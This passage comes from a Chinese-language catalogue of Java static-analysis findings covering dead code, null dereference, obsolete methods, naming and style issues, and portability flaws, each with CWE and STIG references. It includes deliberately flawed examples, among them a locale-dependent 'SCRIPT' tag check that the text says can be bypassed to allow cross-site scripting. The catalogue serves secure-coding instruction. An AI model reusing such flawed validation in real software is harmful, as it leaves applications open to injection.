<p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3050 CAT II</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3050 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3050 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3050 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3050 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3050 CAT II</p>
<h4 id="Dead-Code-Unused-Method"><a href="#Dead-Code-Unused-Method" class="headerlink" title="Dead Code: Unused Method"></a>Dead Code: Unused Method</h4><h5 id="ABSTRACT-70"><a href="#ABSTRACT-70" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>此方法不能从该类以外的任何方法中获得。</p>
<h5 id="EXPLANATION-71"><a href="#EXPLANATION-71" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>不会调用这个方法，或者仅仅通过其他 dead code 进行调用。</p>
<p>例 1：在下面这个类中，doWork() 方法将永远不会被调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class Dead &#123;</span><br><span class="line"></span><br><span class="line">  private void doWork() &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;doing work&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;running Dead&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2： 在下面这个类中，虽然两个私有方法相互调用，但是因为它们中的任何一个都不会在其他地方调用，所以最终还是 dead code。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public class DoubleDead &#123;</span><br><span class="line"></span><br><span class="line">  private void doTweedledee() &#123;</span><br><span class="line"></span><br><span class="line">    doTweedledumb();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  private void doTweedledumb() &#123;</span><br><span class="line"></span><br><span class="line">    doTweedledee();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    System.out.println(&quot;running DoubleDead&quot;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>（在这里，我们应该庆幸没有使用这两种方法：调用其中任何一种方法都会导致死循环。）</p>
<h5 id="RECOMMENDATIONS-72"><a href="#RECOMMENDATIONS-72" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>无用方法有可能指出调度代码中的 bug 所在。</p>
<p>例 3：如果类中一个名为 getWitch() 的方法被标记为死方法，同时这个类还包含以下调度方法，那么这可能是由于复制粘帖错误而引起的。“w”应返回 getWitch() 而不是 getMummy()。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public ScaryThing getScaryThing(char st) &#123;</span><br><span class="line"></span><br><span class="line">  switch(st) &#123;</span><br><span class="line"></span><br><span class="line">    case &apos;m&apos;:</span><br><span class="line"></span><br><span class="line">      return getMummy();</span><br><span class="line"></span><br><span class="line">    case &apos;w&apos;:</span><br><span class="line"></span><br><span class="line">      return getMummy();</span><br><span class="line"></span><br><span class="line">    default:</span><br><span class="line"></span><br><span class="line">      return getBlob();</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总之，您应该去修改或是删除 dead code。要修复 dead code，请通过公共方法直接或间接执行此 dead code。Dead code 不仅不能实现任何程序功能，还会带来额外的麻烦和维护负担。</p>
<h5 id="REFERENCES-69"><a href="#REFERENCES-69" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 561</p>
<p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3050 CAT II</p>
<p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3050 CAT II</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3050 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3050 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3050 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3050 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3050 CAT II</p>
<h4 id="Null-Dereference"><a href="#Null-Dereference" class="headerlink" title="Null Dereference"></a>Null Dereference</h4><h5 id="ABSTRACT-71"><a href="#ABSTRACT-71" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序可能会间接引用一个空指针，从而引起 NullPointerException 异常。</p>
<h5 id="EXPLANATION-72"><a href="#EXPLANATION-72" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>空指针错误通常是由于违反了一个或者多个程序员的假设而造成的。</p>
<p>大部分空指针问题只会引起常规软件可靠性问题，但如果攻击者能够故意触发空指针间接引用，该攻击者就有可能利用引发的异常绕过安全逻辑，或致使应用程序泄漏调试信息，这些调试信息对于规划随后的攻击具有利用价值。</p>
<p>示例：在以下代码中，程序员假定系统始终会定义一个名为“cmd”的属性。如果攻击者能够控制程序环境以使“cmd”变成未定义的属性，那么程序会在尝试调用 trim() 方法时抛出一个 Null 指针异常。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">String val = null;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">cmd = System.getProperty(&quot;cmd&quot;);</span><br><span class="line"></span><br><span class="line">if (cmd)</span><br><span class="line"></span><br><span class="line">	val = util.translateCommand(cmd);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">cmd = val.trim();</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-73"><a href="#RECOMMENDATIONS-73" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>由于间接引用空指针而引发的安全问题几乎始终与程序处理运行时异常的方式有关。如果软件采用一种固定且执行情况良好的方法来处理这些运行时异常，则会大大减少潜在的安全隐患。</p>
<h5 id="REFERENCES-70"><a href="#REFERENCES-70" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 476</p>
<p>[2] Standards Mapping - MISRA C 2012 Rule 1.3</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-5 Denial of Service Protection (P1)</p>
<p>[4] Standards Mapping - OWASP Top 10 2004 A9 Application Denial of Service</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.9</p>
<p>[6] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[7] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP6080 CAT II</p>
<p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP6080 CAT II</p>
<p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP6080 CAT II</p>
<p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP6080 CAT II</p>
<p>[13] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP6080 CAT II</p>
<p>[14] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP6080 CAT II</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP6080 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002400 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002400 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002400 CAT II</p>
<p>[19] Standards Mapping - Web Application Security Consortium 24 + 2 Denial of Service</p>
<p>[20] Standards Mapping - Web Application Security Consortium Version 2.00 Denial of Service (WASC-10)</p>
<h4 id="Obsolete"><a href="#Obsolete" class="headerlink" title="Obsolete"></a>Obsolete</h4><h5 id="ABSTRACT-72"><a href="#ABSTRACT-72" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用不推荐的或过时的函数可能表示这是一段被忽略的代码。</p>
<h5 id="EXPLANATION-73"><a href="#EXPLANATION-73" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>随着编程语言的发展，有时会弃用些一些方法，原因是：</p>
<p>－ 为了改进该编程语言 - 对如何有效、安全地执行操作有了更深一步的了解</p>
<p>－ 某些操作的管理规则发生了变化</p>
<p>在某一种编程语言中，人们通常会放弃使用某些方法，转而采用更新的方法。在执行同样的任务时，新方法会采用不同的处理方式，这种方式往往比原有的方法更合理。</p>
<p>示例：以下代码使用一个字节数组和一个指定每个 16 位 Unicode 字符中前 8 位的值来构造一个字符串对象。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">String name = new String(nameBytes, highByte);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>在这个例子中，构造函数可能无法正确地将字节转换成字符，这取决于由 nameBytes 表述的编码字符串所使用的字符集。随着用于编码字符串的字符集的不断发展，这个构造函数已经过时，取而代之的是新的构造函数。新构造函数使用了名为 charset 的参数，用以对字节进行编码，从而实现字节的转换。</p>
<p>并非所有函数都会因为存在安全漏洞而被弃用或被取代。然而，出现被弃用的函数通常表示周围代码已经不起作用了，有可能处于不受维护的状况。在过去很长一段时间内，人们并没有将软件安全放在首位，甚至都未曾考虑过。如果程序使用了不推荐的或过时的函数，在其附近就会潜伏着安全问题。</p>
<h5 id="RECOMMENDATIONS-74"><a href="#RECOMMENDATIONS-74" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要使用不推荐的或过时的函数。不管是否会对安全产生直接影响，都要使用最新的函数来代替这些过时的函数。当您遇到过时的函数时，应意识到它的出现可能会给周围的代码带来安全隐患。请考虑进行应用程序开发时所依据的有关安全方面的各种假设。它们是否仍然有效？使用特定的过时函数是否会带来更大的维护问题？</p>
<h5 id="REFERENCES-71"><a href="#REFERENCES-71" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] MET02-J. Do not use deprecated or obsolete classes or methods CERT</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 477</p>
<h4 id="Poor-Style-Confusing-Naming-class-and-member"><a href="#Poor-Style-Confusing-Naming-class-and-member" class="headerlink" title="Poor Style: Confusing Naming(class_and_member)"></a>Poor Style: Confusing Naming(class_and_member)</h4><h5 id="ABSTRACT-73"><a href="#ABSTRACT-73" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>类成员与其封装类同名。</p>
<h5 id="EXPLANATION-74"><a href="#EXPLANATION-74" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Java 允许类成员与封装类使用同一个名称，但是这通常只会造成混乱和错误的代码。</p>
<p>例 1：以下类中存在一些错误。请尝试一下如何调试这些错误。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class Name &#123;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  private Name Name;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  public Name getName() &#123;</span><br><span class="line"></span><br><span class="line">    return Name.Name;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>例 2：以下代码摘自 WebGoat，它向我们展示了一个由 confusing naming 问题而产生的 bug [1]。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class CreateDB</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	public void CreateDB() &#123; &#125;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>作者试图为 CreateDB 类创建一个构造函数，但却在不经意间定义了返回值的类型（void），这就相当于他创建了一个常规方法而已。</p>
<h5 id="RECOMMENDATIONS-75"><a href="#RECOMMENDATIONS-75" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请重命名类成员，以避免成员与其封装类之间出现混淆。</p>
<h5 id="REFERENCES-72"><a href="#REFERENCES-72" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] The WebGoat Project OWASP</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<h4 id="Poor-Style-Confusing-Naming-member-and-method"><a href="#Poor-Style-Confusing-Naming-member-and-method" class="headerlink" title="Poor Style: Confusing Naming(member_and_method)"></a>Poor Style: Confusing Naming(member_and_method)</h4><h5 id="ABSTRACT-74"><a href="#ABSTRACT-74" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>该类包含具有同一名称的字段和方法。</p>
<h5 id="EXPLANATION-75"><a href="#EXPLANATION-75" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在同一个类中，成员字段与方法同名会给程序员带来诸多困扰。当他想要访问某字段时却意外地调用了与之同名的方法；反之当他想要调用某一方法时却又访问了与之同名的字段。</p>
<p>例 1：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Totaller &#123;</span><br><span class="line"></span><br><span class="line">  private int total;</span><br><span class="line"></span><br><span class="line">  public int total() &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-76"><a href="#RECOMMENDATIONS-76" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>重新命名方法或字段。如果从方法中可以返回该字段，考虑按以下标准 getter/setter 命名原则对其进行命名：</p>
<p>例 2： 例 1 中的代码应该用以下方式重写：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class Totaller &#123;</span><br><span class="line"></span><br><span class="line">  private int total;</span><br><span class="line"></span><br><span class="line">  public int getTotal() &#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-73"><a href="#REFERENCES-73" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<h4 id="Poor-Style-Empty-Synchronized-Block"><a href="#Poor-Style-Empty-Synchronized-Block" class="headerlink" title="Poor Style: Empty Synchronized Block"></a>Poor Style: Empty Synchronized Block</h4><h5 id="ABSTRACT-75"><a href="#ABSTRACT-75" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>若同步代码块中不包含指令，它不能起到预期的效果。</p>
<h5 id="EXPLANATION-76"><a href="#EXPLANATION-76" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Java 中的同步处理是一个非常棘手的问题。一个 empty synchronized block 通常只标志程序员正在处理同步问题，但还没有达到预期的结果。</p>
<p>示例：</p>
<p>synchronized(this) { }</p>
<h5 id="RECOMMENDATIONS-77"><a href="#RECOMMENDATIONS-77" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请仔细考虑是否需要在附近的代码中进行同步处理。若不需要，则删除 empty synchronized block；反之，就请在该代码块中加入必要的代码。</p>
<h5 id="REFERENCES-74"><a href="#REFERENCES-74" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 585</p>
<h4 id="Poor-Style-Identifier-Contains-Dollar-Symbol"><a href="#Poor-Style-Identifier-Contains-Dollar-Symbol" class="headerlink" title="Poor Style: Identifier Contains Dollar Symbol ($)"></a>Poor Style: Identifier Contains Dollar Symbol ($)</h4><h5 id="ABSTRACT-76"><a href="#ABSTRACT-76" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>建议不要使用美元符号（$）作为标识符。</p>
<h5 id="EXPLANATION-77"><a href="#EXPLANATION-77" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在 Java 语言规范的第 3.8 节中论述了美元符号，但仅将它作为用于机器产生的源代码中的标识符。</p>
<p>示例：</p>
<p>int un$afe;</p>
<h5 id="RECOMMENDATIONS-78"><a href="#RECOMMENDATIONS-78" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>对使用美元符号 ($) 的标识符进行重命名并不包含过载的含义。</p>
<h5 id="REFERENCES-75"><a href="#REFERENCES-75" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] J. Gosling, B. Joy, G. Steele, G. Bracha The Java Language Specification, Second Edition Addison-Wesley</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<h4 id="Poor-Style-Redundant-Initialization"><a href="#Poor-Style-Redundant-Initialization" class="headerlink" title="Poor Style: Redundant Initialization"></a>Poor Style: Redundant Initialization</h4><h5 id="ABSTRACT-77"><a href="#ABSTRACT-77" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>变量赋值后并不使用，而变成一个死存储。</p>
<h5 id="EXPLANATION-78"><a href="#EXPLANATION-78" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>没有使用该变量的初始值。初始化之后，变量或者被重新赋值，或者转向作用域之外。</p>
<p>示例：以下摘录的代码为变量 r 赋值，并在没有使用所赋数值的情况下，对其加以重写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int r = getNum();</span><br><span class="line"></span><br><span class="line">r = getNewNum(buf);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-79"><a href="#RECOMMENDATIONS-79" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了使代码易于理解和维护，删除不必要的赋值。</p>
<h5 id="REFERENCES-76"><a href="#REFERENCES-76" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3050 CAT II</p>
<p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3050 CAT II</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3050 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3050 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3050 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3050 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3050 CAT II</p>
<h4 id="Poor-Style-Value-Never-Read"><a href="#Poor-Style-Value-Never-Read" class="headerlink" title="Poor Style: Value Never Read"></a>Poor Style: Value Never Read</h4><h5 id="ABSTRACT-78"><a href="#ABSTRACT-78" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>变量赋值后并不使用，而变成一个死存储。</p>
<h5 id="EXPLANATION-79"><a href="#EXPLANATION-79" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>没有使用该变量的值。赋值之后，变量或者被重新赋值，或者超出范围之外。</p>
<p>示例：以下摘录的代码为变量 r 赋值，并在没有使用所赋数值的情况下，对其加以重写。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = getName();</span><br><span class="line"></span><br><span class="line">r = getNewBuffer(buf);</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-80"><a href="#RECOMMENDATIONS-80" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了使代码易于理解和维护，删除不必要的赋值。</p>
<h5 id="REFERENCES-77"><a href="#REFERENCES-77" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 563</p>
<p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3050 CAT II</p>
<p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3050 CAT II</p>
<p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3050 CAT II</p>
<p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3050 CAT II</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3050 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3050 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3050 CAT II</p>
<h4 id="Portability-Flaw-File-Separator"><a href="#Portability-Flaw-File-Separator" class="headerlink" title="Portability Flaw: File Separator"></a>Portability Flaw: File Separator</h4><h5 id="ABSTRACT-79"><a href="#ABSTRACT-79" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>使用硬编码文件分隔符会导致可移植性问题。</p>
<h5 id="EXPLANATION-80"><a href="#EXPLANATION-80" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>不同的操作系统使用不同的字符作为文件分隔符。例如，Microsoft Windows 系统使用“\”，而 UNIX 系统则使用“/”。应用程序需要在不同的平台上运行时，使用硬编码文件分隔符会导致应用程序逻辑执行错误，并有可能导致 denial of service。</p>
<p>例 1：以下代码使用硬编码文件分隔符来打开文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">File file = new File(directoryName + &quot;\\&quot; + fileName);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-81"><a href="#RECOMMENDATIONS-81" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为编写可移植代码，不应使用硬编码文件分隔符，而应使用语言库提供的独立于平台的 API。</p>
<p>例 2：下列代码执行与例 1 相同的功能，但使用独立于平台的 API 来指定文件分隔符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">File file = new File(directoryName + File.separator + fileName);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-78"><a href="#REFERENCES-78" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] INPUT-1: Validate inputs Oracle</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 474</p>
<p>[3] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.6</p>
<p>[4] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.6</p>
<p>[5] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.6</p>
<p>[6] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002520 CAT II</p>
<p>[7] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002520 CAT II</p>
<p>[8] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002520 CAT II</p>
<h4 id="Portability-Flaw-Locale-Dependent-Comparison"><a href="#Portability-Flaw-Locale-Dependent-Comparison" class="headerlink" title="Portability Flaw: Locale Dependent Comparison"></a>Portability Flaw: Locale Dependent Comparison</h4><h5 id="ABSTRACT-80"><a href="#ABSTRACT-80" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>在未指定区域设置时，可能会发现意外的可移植性问题。</p>
<h5 id="EXPLANATION-81"><a href="#EXPLANATION-81" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>对可能与区域设置相关的数据进行比较时，应指定相应的区域设置。</p>
<p>示例 1：以下示例尝试执行验证，以确定用户输入是否包含 <code>&lt;script&gt;</code> 标签。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">public String tagProcessor(String tag)&#123;</span><br><span class="line"></span><br><span class="line">  if (tag.toUpperCase().equals(&quot;SCRIPT&quot;))&#123;</span><br><span class="line"></span><br><span class="line">    return null;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //does not contain SCRIPT tag, keep processing input</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>关于上述代码的问题是：在使用不带区域设置的 java.lang.String.toUpperCase() 时，其将使用默认的区域设置规则。使用土耳其区域设置 “title”.toUpperCase() 时将返回 “T\u0130TLE”，其中 “\u0130” 是 “LATIN CAPITAL LETTER I WITH DOT ABOVE” 字符。这会导致生成意外结果，例如，在示例 1 中，会导致此验证无法捕获 “script” 一词，从而可能造成跨站脚本攻击漏洞。</p>
<h5 id="RECOMMENDATIONS-82"><a href="#RECOMMENDATIONS-82" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了防止出现此问题，请始终确保指定默认区域设置，或者指定可以接受这些字符（如 toUpperCase()）并带有 API 的区域设置。</p>
<p>示例 2:以下示例通过手动方式将区域设置指定为 toUpperCase() 的参数。</p>
